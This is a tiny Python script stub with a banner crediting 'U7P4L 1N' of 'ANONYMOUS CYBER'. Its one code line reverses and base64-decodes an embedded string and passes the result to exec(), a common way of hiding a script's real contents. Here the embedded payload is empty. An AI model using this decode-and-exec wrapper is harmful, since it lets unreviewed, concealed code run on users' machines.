#_____________________| INFO  |______________________#
# ENCRYPTED BY :  U7P4L 1N
# TEAM : ANONYMOUS CYBER
# PYTHON VERSION : 3.11
# GITHUB : https://github.com/U7P4L-IN
# TIME  : Sat Jul 20 19:32:02 2024
#__________________| MAIN MENU  |__________________#
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))